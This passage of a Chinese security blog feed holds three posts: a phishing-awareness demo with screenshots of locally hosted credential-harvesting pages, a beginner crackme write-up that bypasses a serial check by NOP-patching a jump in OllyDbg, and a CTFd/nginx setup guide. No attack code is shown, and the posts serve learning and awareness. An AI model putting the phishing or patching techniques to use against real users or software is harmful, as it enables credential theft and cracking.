</p><h1 id="科普时间"><a href="#科普时间" class="headerlink" title="科普时间"></a>科普时间</h1><p>收集了几个网上公开的钓鱼网站源码，然后在本地搭建了一下，给大家看下效果。  </p><h2 id="QQ空间钓鱼"><a href="#QQ空间钓鱼" class="headerlink" title="QQ空间钓鱼"></a>QQ空间钓鱼</h2><p>手机访问效果如下：<br>输入账号密码后跳转至真实的网站<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4sidekmc4j31hl0u0dil.jpg" alt><br>此时后台就拿到了你输入的内容<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4siewcdmuj31hc0k43zx.jpg" alt></p><h2 id="游戏活动钓鱼"><a href="#游戏活动钓鱼" class="headerlink" title="游戏活动钓鱼"></a>游戏活动钓鱼</h2><p>访问效果<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g4sihch9o9j31hc0scwgc.jpg" alt><br><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g4siiayuw7j31hc0scjt5.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4sijqnxtnj31hc0izgnm.jpg" alt></p><h2 id="业务活动页面钓鱼"><a href="#业务活动页面钓鱼" class="headerlink" title="业务活动页面钓鱼"></a>业务活动页面钓鱼</h2><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4sip813juj30ya0u0wi3.jpg" alt><br>后台收到账号信息<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4siq4mpdbj31hc0l6wg9.jpg" alt><br>这个网站也是输入完账号密码跳转到真实的页面，我发现这个页面分毫不差，看对比图<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g4siust5ogj30ya0u079u.jpg" alt><br>如何辨别钓鱼网站？<a href="https://www.zhihu.com/question/35424623" target="_blank" rel="noopener">知乎链接</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向学习[1]一道入门题详解</title>
      <link href="/2019/06/21/Simple-reverse/"/>
      <url>/2019/06/21/Simple-reverse/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在学校的练习平台上找到了一个入门级的逆向小程序，给大家拿来练手。面向小白，大佬勿喷。<br><a href="https://pan.baidu.com/s/1wG9nMTSBVuJfK1Rrtds8pw" target="_blank" rel="noopener">程序下载地址，密码：a4nh</a>  </p><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>找到验证逻辑的条件判断指令处，通过修改条件跳转指令，使得程序接下来走验证成功流程，即可在验证成功弹出消息框中得到对应Key。<br>首先下载源程序，然后拖到PEiD分析一下 ，发现存在UPX的壳。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494p0ydboj30hd09w75b.jpg" alt><br>UPX脱壳工具网上有很多，随便找一个对程序进行脱壳即可。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494r7gjdbj30h60chac5.jpg" alt><br>脱壳成功，然后把脱壳后的程序拖到Ollydbg分析。<br>先查找所有参考文本字符串，定位到程序弹出错误的地方。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494tu348pj30e909hdg1.jpg" alt><br>查找”Serial is error!”字符串<br>00440570地址<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494vxbqv4j30vt0aht9t.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494wk3gwsj30z40c9gmy.jpg" alt><br>向下走，发现这个跳转是由上方004404D6地址跳转实现的<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494xtery3j30yo0bg0ty.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494ypdpojj30zi0bl3zl.jpg" alt><br>但是这个条件不是<br>继续向下走，00440500地址还有一处跳转，这个跳转是距离错误提示最近的<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g494zl6tarj30yf0b5wfj.jpg" alt><br>我们在此处用NOP填充<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4950bzos2j30yo0bb40o.jpg" alt><br>然后再次运行程序，输入任意字符得到Key<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4951h8kw1j31030iidic.jpg" alt></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>非常基础入门的一道逆向题，希望以后有机会和时间能更新一些进阶的题目~</p>]]></content>
      
      
      <categories>
          
          <category> 逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈新版CTFd的安装以及后期运维</title>
      <link href="/2019/06/19/Install-ctfd/"/>
      <url>/2019/06/19/Install-ctfd/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一段时间学校社团组织了一次CTF小比赛，当时就是用的CTFd这个平台。无奈的是最近CTFd更新了，所以旧版本的包我就安装不上了。最近研究了一下新版的CTFd(v2.1.2)，顺便还把新版的CTFd汉化了。总体来说，现在的CTFd功能越来越强大了，变成了团队赛以及个人赛两种模式，在管理员后台也可以给一些用户进行奖励加分的操作等等…<br><a href="https://github.com/CTFd/CTFd/" target="_blank" rel="noopener">官方Github地址</a>  </p><h1 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h1><ul><li>Centos 7 64位  </li><li>Docker  </li><li>docker-compose  </li><li>nginx  </li><li>python2.7  </li><li>python-pip  </li></ul><h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><p>我感觉用Docker安装更加方便一些，所以此次用docker-compose up的方式进行安装的。  </p><h2 id="首先安装Docker"><a href="#首先安装Docker" class="headerlink" title="首先安装Docker"></a>首先安装Docker</h2><p>安装需要的软件包  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2 bind-utils</span><br></pre></td></tr></table></figure><p>设置yum源  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>安装docker  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce</span><br></pre></td></tr></table></figure><p>启动并加入开机启动  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure><p>验证是否安装成功  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45kxdj28gj30rs0cn0tf.jpg" alt>  </p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><p><a href="https://www.cnblogs.com/YatHo/p/7815400.html" target="_blank" rel="noopener">参考链接</a><br>先安装python-pip  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install epel-release </span><br><span class="line">yum -y install python-pip</span><br></pre></td></tr></table></figure><p>检查pip是否安装成功  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip -V</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45l2t0tddj30rs01ea9x.jpg" alt><br>对安装的pip进行升级(可选)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>正式开始安装docker-compose  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure><p>安装pip报错以及解决方法  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果报错：ReadTimeoutError: HTTPSConnectionPool(host=&apos;pypi.python.org&apos;, port=443): Read timed out</span><br><span class="line">解决方法：pip --default-timeout=200 install -U docker-compose</span><br></pre></td></tr></table></figure><p>检查docker-compose是否成功安装  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45l3vs231j30rs01dmx1.jpg" alt>  </p><h2 id="下载CTFd"><a href="#下载CTFd" class="headerlink" title="下载CTFd"></a>下载CTFd</h2><p>如果你的系统上没有git请先安装git  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y git</span><br></pre></td></tr></table></figure><p>从Github上克隆CTFd  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ctfd/ctfd.git</span><br></pre></td></tr></table></figure><p>也可以下载我打包好的压缩包直接上传到你的服务器，v2.1.2版本，当前最新。<br><a href="https://pan.baidu.com/s/1IhSEvnx5ZqmvXfDQLwIbkw" target="_blank" rel="noopener">下载链接地址，密码:xg7e</a><br>下载成功后解压，你可以看到一个CTFd文件夹<br>CTFd的主目录结构<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g466dbvimwj317d0pgab2.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g466jptpwxj314k0m1js2.jpg" alt><br>此后你可以选择是否用中文版，如果想用中文版，直接下载我提供的汉化包替换主目录/CTFd路径下的themes目录即可(记得做好备份)。<br><a href="https://pan.baidu.com/s/17WgBkVZB10Qy5Na1VmoMng" target="_blank" rel="noopener">汉化包下载链接地址，密码:nkqd</a><br>然后在CTFd的主目录下  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><p>静静等待安装完成，成功会弹出<code>http://0.0.0.0:8000</code><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45l6ek06bj30rs0ctmyu.jpg" alt><br>此时，你的CTFd就安装完成了。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45lijhw0dj31hc0scgo5.jpg" alt><br>如果安装成功不能访问，看下是不是防火墙把端口给过滤掉了。  </p><h2 id="汉化效果"><a href="#汉化效果" class="headerlink" title="汉化效果"></a>汉化效果</h2><p>替换themes目录后效果如下：<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45nk6jo15j31hc0sc76u.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45nkkdvmtj31hc0scgnk.jpg" alt>  </p><h1 id="后续运维"><a href="#后续运维" class="headerlink" title="后续运维"></a>后续运维</h1><p>CTFd的数据库用的是mariadb,看一下docker运行了哪些容器<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45lmw0n3sj316f098gm0.jpg" alt><br>可以看到运行了三个容器，分别是ctfd，mariadb，redis<br>我们可以直接进入到各个容器进行操作。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [CONTAINER ID] /bin/bash</span><br></pre></td></tr></table></figure><p>数据库root账户的密码默认为ctfd<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45ltk1suxj30rs0fugme.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45m1smtvjj30rs0kdaav.jpg" alt>原先旧版的CTFd如果数据库不设置UTF-8会乱码，新版本测试过程中没碰到此类问题，如果乱码就进入到ctfd数据库敲一下命令  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE [table name] CONVERT TO CHARACTER SET utf8;</span><br></pre></td></tr></table></figure><h2 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h2><p>如果有需要的话也可以配置一下nginx，这样访问速度会变快，而且作为一个中间件更改端口会更方便(当然小伙伴们选择Apache也是可以的)。<br><a href="https://www.cnblogs.com/kaid/p/7640723.html" target="_blank" rel="noopener">参考链接</a>  </p><h2 id="安装所需环境"><a href="#安装所需环境" class="headerlink" title="安装所需环境"></a>安装所需环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc-c++</span><br><span class="line">yum install -y pcre pcre-devel</span><br><span class="line">yum install -y zlib zlib-devel</span><br><span class="line">yum install -y openssl openssl-devel</span><br></pre></td></tr></table></figure><p>根目录下新建一个文件夹nginx  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /nginx</span><br><span class="line">cd /nginx</span><br><span class="line">wget https://nginx.org/download/nginx-1.14.2.tar.gz</span><br><span class="line">tar -zxvf nginx-1.14.2.tar.gz</span><br></pre></td></tr></table></figure><p>然后进入到目录下进行编译  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>查找一下nginx的位置<br><code>whereis nginx</code><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45nryi0csj30rs02i3ye.jpg" alt>  </p><h2 id="nginx常见命令"><a href="#nginx常见命令" class="headerlink" title="nginx常见命令"></a>nginx常见命令</h2><p>启动、停止nginx  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/nginx/sbin/</span><br><span class="line">./nginx</span><br><span class="line">./nginx -s stop</span><br><span class="line">./nginx -s quit</span><br><span class="line">./nginx -s reload</span><br><span class="line">./nginx -s quit:此方式停止步骤是待nginx进程处理任务完毕进行停止。</span><br><span class="line">./nginx -s stop:此方式相当于先查出nginx进程id再使用kill命令强制杀掉进程。</span><br></pre></td></tr></table></figure><h2 id="nginx开机自启动"><a href="#nginx开机自启动" class="headerlink" title="nginx开机自启动"></a>nginx开机自启动</h2><p>即在rc.local增加启动代码就可以了。<br><code>vi /etc/rc.local</code><br>增加一行 /usr/local/nginx/sbin/nginx (根据whereis nginx实际的位置为准)<br>设置执行权限：<br><code>chmod 755 rc.local</code><br><em>配置nginx</em><br><em>配置之前需要先运行一下nginx</em>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./nginx</span><br><span class="line">./nginx -s quit</span><br></pre></td></tr></table></figure><p><em>然后在修改配置文件</em><br><code>vim /usr/local/nginx/conf/nginx.conf（whereis nginx 实际情况）</code><br>server下的location替换为  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location /&#123;</span><br><span class="line">proxy_pass http://localhost:8000;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">proxy_redirect off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45nb1bstjj30rs0atmxi.jpg" alt><br>最后需要在firewall中开放80端口<br><code>firewall-cmd --zone=public --add-port=80/tcp --permanent</code><br>然后在启动一下nginx就可以通过80端口访问你的CTFd了。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45ncjtfi5j30zv0dcwfa.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g45nd8o99rj31hc0scdie.jpg" alt><br><strong>注：有些安装步骤源于互联网，均已标注原文链接。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 平台搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
